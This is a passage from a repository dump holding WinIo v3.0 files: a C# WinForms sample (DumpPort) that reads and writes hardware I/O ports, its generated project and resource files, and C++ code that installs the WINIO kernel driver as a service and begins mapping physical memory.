    <Compile Include="Properties\Settings.Designer.cs">
      <AutoGen>True</AutoGen>
      <DependentUpon>Settings.settings</DependentUpon>
      <DesignTimeSharedInput>True</DesignTimeSharedInput>
    </Compile>
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include="Microsoft.Net.Framework.2.0">
      <Visible>False</Visible>
      <ProductName>.NET Framework 2.0 %28x86%29</ProductName>
      <Install>true</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.0">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.0 %28x86%29</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
  <PropertyGroup>
    <PostBuildEvent>
    </PostBuildEvent>
  </PropertyGroup>
</Project>
```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/DumpPort.manifest`:

```manifest
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Form1.Designer.cs`:

```cs
namespace DumpPort
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.btnGetValue = new System.Windows.Forms.Button();
            this.btnSetValue = new System.Windows.Forms.Button();
            this.btnQuit = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.txtPortAddr = new System.Windows.Forms.TextBox();
            this.txtValue = new System.Windows.Forms.TextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // btnGetValue
            // 
            this.btnGetValue.Location = new System.Drawing.Point(32, 220);
            this.btnGetValue.Name = "btnGetValue";
            this.btnGetValue.Size = new System.Drawing.Size(75, 23);
            this.btnGetValue.TabIndex = 0;
            this.btnGetValue.Text = "Get Value";
            this.btnGetValue.UseVisualStyleBackColor = true;
            this.btnGetValue.Click += new System.EventHandler(this.btnGetValue_Click);
            // 
            // btnSetValue
            // 
            this.btnSetValue.Location = new System.Drawing.Point(137, 220);
            this.btnSetValue.Name = "btnSetValue";
            this.btnSetValue.Size = new System.Drawing.Size(75, 23);
            this.btnSetValue.TabIndex = 1;
            this.btnSetValue.Text = "Set Value";
            this.btnSetValue.UseVisualStyleBackColor = true;
            this.btnSetValue.Click += new System.EventHandler(this.btnSetValue_Click);
            // 
            // btnQuit
            // 
            this.btnQuit.Location = new System.Drawing.Point(242, 220);
            this.btnQuit.Name = "btnQuit";
            this.btnQuit.Size = new System.Drawing.Size(75, 23);
            this.btnQuit.TabIndex = 2;
            this.btnQuit.Text = "Quit";
            this.btnQuit.UseVisualStyleBackColor = true;
            this.btnQuit.Click += new System.EventHandler(this.btnQuit_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(44, 140);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(156, 13);
            this.label1.TabIndex = 3;
            this.label1.Text = "Please enter port address (hex):";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(44, 170);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(63, 13);
            this.label2.TabIndex = 4;
            this.label2.Text = "Value (hex):";
            // 
            // txtPortAddr
            // 
            this.txtPortAddr.Location = new System.Drawing.Point(206, 137);
            this.txtPortAddr.MaxLength = 4;
            this.txtPortAddr.Name = "txtPortAddr";
            this.txtPortAddr.Size = new System.Drawing.Size(36, 20);
            this.txtPortAddr.TabIndex = 5;
            this.txtPortAddr.Text = "0";
            // 
            // txtValue
            // 
            this.txtValue.Location = new System.Drawing.Point(113, 167);
            this.txtValue.MaxLength = 2;
            this.txtValue.Name = "txtValue";
            this.txtValue.Size = new System.Drawing.Size(23, 20);
            this.txtValue.TabIndex = 6;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 26.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(87, 19);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(174, 39);
            this.label3.TabIndex = 7;
            this.label3.Text = "DumpPort";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(62, 69);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(225, 16);
            this.label4.TabIndex = 8;
            this.label4.Text = "Copyright 1998-2010 by Yariv Kaplan";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.Location = new System.Drawing.Point(116, 97);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(117, 16);
            this.label5.TabIndex = 9;
            this.label5.Text = "www.internals.com";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(348, 263);
            this.ControlBox = false;
            this.Controls.Add(this.label5);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.txtValue);
            this.Controls.Add(this.txtPortAddr);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.btnQuit);
            this.Controls.Add(this.btnSetValue);
            this.Controls.Add(this.btnGetValue);
            this.Name = "Form1";
            this.Text = "DumpPort - www.internals.com";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button btnGetValue;
        private System.Windows.Forms.Button btnSetValue;
        private System.Windows.Forms.Button btnQuit;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox txtPortAddr;
        private System.Windows.Forms.TextBox txtValue;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label5;
    }
}


```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Form1.cs`:

```cs
// ---------------------------------------------------- //
//                      WinIo v3.0                      //
//          Direct Hardware Access Under Windows        //
//           Copyright 1998-2010 Yariv Kaplan           //
//               http://www.internals.com               //
// ---------------------------------------------------- //

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;


namespace DumpPort
{
    public unsafe partial class Form1 : Form
    {
        [DllImport("kernel32.dll")]
        private extern static IntPtr LoadLibrary(String DllName);

        [DllImport("kernel32.dll")]
        private extern static IntPtr GetProcAddress(IntPtr hModule, String ProcName);

        [DllImport("kernel32")]
        private extern static bool FreeLibrary(IntPtr hModule);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool InitializeWinIoType();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool GetPortValType(UInt16 PortAddr, UInt32* pPortVal, UInt16 Size);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool SetPortValType(UInt16 PortAddr, UInt32 PortVal, UInt16 Size);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool ShutdownWinIoType();

        IntPtr hMod;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Check if this is a 32 bit or 64 bit system
            if (IntPtr.Size == 4)
            {
                hMod = LoadLibrary("WinIo32.dll");

            }
            else if (IntPtr.Size == 8)
            {
                hMod = LoadLibrary("WinIo64.dll");
            }

            if (hMod == IntPtr.Zero)
            {
                MessageBox.Show("Can't find WinIo dll.\nMake sure the WinIo library files are located in the same directory as your executable file.", "DumpPort", MessageBoxButtons.OK, MessageBoxIcon.Error);
                this.Close();
            }

            IntPtr pFunc = GetProcAddress(hMod, "InitializeWinIo");

            if (pFunc != IntPtr.Zero)
            {
                InitializeWinIoType InitializeWinIo = (InitializeWinIoType)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(InitializeWinIoType));
                bool Result = InitializeWinIo();

                if (!Result)
                {
                    MessageBox.Show("Error returned from InitializeWinIo.\nMake sure you are running with administrative privileges and that the WinIo library files are located in the same directory as your executable file.", "DumpPort", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    FreeLibrary(hMod);
                    this.Close();
                }
            }

            btnGetValue_Click(this, null);
        }

        private void btnQuit_Click(object sender, EventArgs e)
        {
            IntPtr pFunc = GetProcAddress(hMod, "ShutdownWinIo");

            if (pFunc != IntPtr.Zero)
            {
                ShutdownWinIoType ShutdownWinIo = (ShutdownWinIoType)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(ShutdownWinIoType));

                ShutdownWinIo();
                FreeLibrary(hMod);
            }
          
            this.Close();
        }

        private void btnGetValue_Click(object sender, EventArgs e)
        {
            IntPtr pFunc = GetProcAddress(hMod, "GetPortVal");

            if (pFunc != IntPtr.Zero)
            {
                UInt16 PortAddr;
                UInt32 PortVal;

                PortAddr = UInt16.Parse(txtPortAddr.Text, System.Globalization.NumberStyles.HexNumber);

                GetPortValType GetPortVal = (GetPortValType)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(GetPortValType));

                // Call WinIo to get value
                bool Result = GetPortVal(PortAddr, &PortVal, 1);

                if (Result)
                {
                    txtValue.Text = PortVal.ToString("X");
                }
                else
                {
                    MessageBox.Show("Error returned from GetPortVal", "DumpPort", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void btnSetValue_Click(object sender, EventArgs e)
        {
            IntPtr pFunc = GetProcAddress(hMod, "SetPortVal");

            if (pFunc != IntPtr.Zero)
            {
                UInt16 PortAddr;
                UInt32 PortVal;

                PortAddr = UInt16.Parse(txtPortAddr.Text, System.Globalization.NumberStyles.HexNumber);
                PortVal = UInt32.Parse(txtValue.Text, System.Globalization.NumberStyles.HexNumber);

                SetPortValType SetPortVal = (SetPortValType)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(SetPortValType));

                // Call WinIo to set value
                bool Result = SetPortVal(PortAddr, PortVal, 1 );

                if (!Result)
                {
                    MessageBox.Show("Error returned from SetPortVal", "DumpPort", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}
```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Form1.resx`:

```resx
<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
</root>
```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Program.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace DumpPort
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following 
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("DumpPort")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("www.internals.com")]
[assembly: AssemblyProduct("DumpPort")]
[assembly: AssemblyCopyright("Copyright © Yariv Kaplan 2010")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible 
// to COM components.  If you need to access a type in this assembly from 
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("e4aa10c8-3c4e-4ea5-8461-4da84bf602f5")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version 
//      Build Number
//      Revision
//
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Properties/Resources.Designer.cs`:

```cs
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:2.0.50727.4927
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace DumpPort.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "2.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("DumpPort.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
    }
}

```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Properties/Resources.resx`:

```resx
<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
</root>
```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Properties/Settings.Designer.cs`:

```cs
//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:2.0.50727.4927
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace DumpPort.Properties {
    
    
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "9.0.0.0")]
    internal sealed partial class Settings : global::System.Configuration.ApplicationSettingsBase {
        
        private static Settings defaultInstance = ((Settings)(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings())));
        
        public static Settings Default {
            get {
                return defaultInstance;
            }
        }
    }
}

```

`source/WormholeDrivers/WINIO/Samples/DumpPort/DumpPort/Properties/Settings.settings`:

```settings
<?xml version='1.0' encoding='utf-8'?>
<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)">
  <Profiles>
    <Profile Name="(Default)" />
  </Profiles>
  <Settings />
</SettingsFile>

```

`source/WormholeDrivers/WINIO/Source/Dll/InstDrv.cpp`:

```cpp
// ---------------------------------------------------- //
//                      WinIo v3.0                      //
//				 Direct Hardware Access Under Windows	//
//           Copyright 1998-2010 Yariv Kaplan           //
//               http://www.internals.com               //
// ---------------------------------------------------- //

#include <windows.h>
#include "winio.h"

bool _stdcall InstallWinIoDriver(PWSTR pszWinIoDriverPath, bool IsDemandLoaded)
{
	SC_HANDLE hSCManager;
	SC_HANDLE hService;

	// Remove any previous instance of the driver

	RemoveWinIoDriver();

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCManager)
	{
		// Install the driver

		hService = CreateService(hSCManager,
			L"WINIO",
			L"WINIO",
			SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER,
			(IsDemandLoaded == true) ? SERVICE_DEMAND_START : SERVICE_SYSTEM_START,
			SERVICE_ERROR_NORMAL,
			pszWinIoDriverPath,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL);

		CloseServiceHandle(hSCManager);

		if (hService == NULL)
			return false;
	}
	else
		return false;

	CloseServiceHandle(hService);

	return true;
}


bool _stdcall RemoveWinIoDriver()
{
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	LPQUERY_SERVICE_CONFIG pServiceConfig;
	DWORD dwBytesNeeded;
	DWORD cbBufSize;
	bool bResult;

	StopWinIoDriver();

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (!hSCManager)
	{
		return false;
	}

	hService = OpenService(hSCManager, L"WINIO", SERVICE_ALL_ACCESS);
	CloseServiceHandle(hSCManager);

	if (!hService)
	{
		return false;
	}

	bResult = QueryServiceConfig(hService, NULL, 0, &dwBytesNeeded);

	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		cbBufSize = dwBytesNeeded;
		pServiceConfig = (LPQUERY_SERVICE_CONFIG)malloc(cbBufSize);
		bResult = QueryServiceConfig(hService, pServiceConfig, cbBufSize, &dwBytesNeeded);

		if (!bResult)
		{
			free(pServiceConfig);
			CloseServiceHandle(hService);
			return bResult;
		}

		// If service is set to load automatically, don't delete it!
		if (pServiceConfig->dwStartType == SERVICE_DEMAND_START)
		{
			bResult = DeleteService(hService);
		}
	}

	CloseServiceHandle(hService);

	return bResult;
}


bool _stdcall StartWinIoDriver()
{
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	bool bResult;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCManager)
	{
		hService = OpenService(hSCManager, L"WINIO", SERVICE_ALL_ACCESS);

		CloseServiceHandle(hSCManager);

		if (hService)
		{
			bResult = StartService(hService, 0, NULL) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;

			CloseServiceHandle(hService);
		}
		else
			return false;
	}
	else
		return false;

	return bResult;
}


bool _stdcall StopWinIoDriver()
{
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	SERVICE_STATUS ServiceStatus;
	bool bResult;

	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCManager)
	{
		hService = OpenService(hSCManager, L"WINIO", SERVICE_ALL_ACCESS);

		CloseServiceHandle(hSCManager);

		if (hService)
		{
			bResult = ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);

			CloseServiceHandle(hService);
		}
		else
			return false;
	}
	else
		return false;

	return bResult;
}
```

`source/WormholeDrivers/WINIO/Source/Dll/Phys32.cpp`:

```cpp
// ---------------------------------------------------- //
//                      WinIo v3.0                      //
//				 Direct Hardware Access Under Windows	//
//           Copyright 1998-2010 Yariv Kaplan           //
//               http://www.internals.com               //
// ---------------------------------------------------- //

#include <windows.h>
#include <winioctl.h>
#include "phys32.h"
#include "..\drv\winio_nt.h"
#include "winio.h"


PBYTE _stdcall MapPhysToLin(tagPhysStruct &PhysStruct)
{
	PBYTE pbLinAddr = NULL;
	DWORD dwBytesReturned;

	if (!IsWinIoInitialized)
		return false;

	if (!DeviceIoControl(hDriver, IOCTL_WINIO_MAPPHYSTOLIN, &PhysStruct,
		sizeof(tagPhysStruct), &PhysStruct, sizeof(tagPhysStruct),
		&dwBytesReturned, NULL))
	{
		return NULL;
